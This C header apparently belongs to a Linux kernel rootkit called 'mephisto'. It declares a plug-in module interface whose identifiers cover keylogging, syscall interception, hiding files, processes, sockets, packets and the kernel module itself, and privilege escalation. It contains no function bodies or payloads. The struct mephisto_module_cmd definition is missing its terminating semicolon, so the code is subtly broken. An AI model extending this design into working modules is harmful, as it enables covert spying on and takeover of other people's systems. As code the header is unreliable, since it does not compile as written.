#ifndef MEPHISTO_MODULE_H
#define MEPHISTO_MODULE_H

/**
 * The interface for any module
 */

struct mephisto_module_cmd;

typedef int (* module_execute_t) (struct mephisto_module_cmd* cmd);
typedef int (* module_load_t) (void);
typedef int (* module_unload_t) (void);

enum mephisto_module_identifier
{
    MEPHISTO_SYSCALL_LISTENER     = 0x0001,
    MEPHISTO_KEYLOGGING           = 0x0002,
    MEPHISTO_FILE_HIDING          = 0x0004,
    MEPHISTO_PROCESS_HIDING       = 0x0008,
    MEPHISTO_SOCKET_HIDING        = 0x0010,
    MEPHISTO_PACKET_HIDING        = 0x0020,
    MEPHISTO_KERNEL_MODULE_HIDING = 0x0040,
    MEPHISTO_PRIVILEGE_ESCALATION = 0x0080
};

struct mephisto_module
{
   unsigned int     module_identifier;
   module_load_t    load_callback;
   module_unload_t  unload_callback;
   module_execute_t execute_callback;
};

struct mephisto_module_cmd
{
    unsigned int   cmd;
    unsigned int   buffer_size;
    unsigned char* buffer;
}

void* mephisto_module_get_cmd_param_ptr(
    struct mephisto_module_cmd* cmd,
    unsigned int                position
);

struct mephisto_module_cmd* mephisto_module_create_cmd(
    unsigned int   cmd,
    unsigned int   buffer_size,
    unsigned char* buffer
);

void mephisto_module_delete_cmd(
    struct mephisto_module_cmd* cmd
);

#endif
